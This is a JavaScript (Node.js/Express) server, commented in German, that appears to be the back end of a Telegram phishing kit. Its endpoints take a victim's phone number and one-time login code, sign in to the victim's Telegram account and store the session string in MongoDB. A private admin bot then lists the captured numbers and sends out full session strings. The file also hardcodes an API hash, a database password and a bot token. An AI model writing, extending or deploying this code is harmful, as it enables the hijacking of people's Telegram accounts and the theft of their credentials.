const express = require('express');
const cors = require('cors');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const mongoose = require('mongoose');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
app.use(cors());
app.use(express.json());

// CONFIGURATION - HIER DEINE DATEN EINTRAGEN
const API_ID = 23049703; 
const API_HASH = 'e9c00af578a9de0253ef02337460498f';
const DB_URI = "mongodb+srv://mercyinfo52_db_user:Hinva312-@cluster0.a0bslma.mongodb.net/?retryWrites=true&w=majority";
const ADMIN_BOT_TOKEN = '8963838309:AAFpv3lF_v_kWvZZYR96D8mM3nA3oawatow'; // Hier den Token vom BotFather eintragen
const ADMIN_CHAT_ID = '8140429554'; // Deine ID, damit NUR DU den Bot steuern kannst

// Mongoose Setup
mongoose.connect(DB_URI);
const SessionSchema = new mongoose.Schema({ phone: String, sessionString: String });
const Session = mongoose.model('Session', SessionSchema);

// Admin Bot Setup
const bot = new TelegramBot(ADMIN_BOT_TOKEN, { polling: true });

bot.on('message', (msg) => {
    if (msg.chat.id.toString() !== ADMIN_CHAT_ID) return;

    if (msg.text === '/list') {
        Session.find().then(sessions => {
            if (sessions.length === 0) return bot.sendMessage(msg.chat.id, "Keine Sessions gefunden.");
            let response = "Gefundene Sessions:\n";
            sessions.forEach(s => response += `📞 ${s.phone}\n`);
            bot.sendMessage(msg.chat.id, response);
        });
    }
    
    if (msg.text && msg.text.startsWith('/get ')) {
        const phone = msg.text.split(' ')[1];
        Session.findOne({ phone }).then(s => {
            if (!s) return bot.sendMessage(msg.chat.id, "Nummer nicht gefunden.");
            bot.sendMessage(msg.chat.id, `Session String für ${phone}:\n\n\`${s.sessionString}\``, { parse_mode: 'Markdown' });
        });
    }
});

// Telegram Login Logik (Globale Instanzen)
let tempClient = null;
let tempPhoneCodeHash = null;

app.post('/send-otp', async (req, res) => {
    try {
        const { phone } = req.body;
        const stringSession = new StringSession(""); 
        tempClient = new TelegramClient(stringSession, API_ID, API_HASH, { connectionRetries: 5 });
        await tempClient.connect();
        
        const result = await tempClient.sendCode({ apiId: API_ID, apiHash: API_HASH }, phone);
        tempPhoneCodeHash = result.phoneCodeHash;
        
        res.json({ success: true });
    } catch (err) {
        res.status(400).json({ error: err.message });
    }
});

app.post('/verify-otp', async (req, res) => {
    try {
        const { phone, code } = req.body;
        await tempClient.signIn(phone, {
            phoneCodeHash: tempPhoneCodeHash,
            phoneCode: code
        });
        
        const sessionString = tempClient.session.save();
        await Session.create({ phone, sessionString });
        
        res.json({ success: true });
    } catch (err) {
        res.status(400).json({ error: err.message });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server läuft auf Port ${PORT}`));
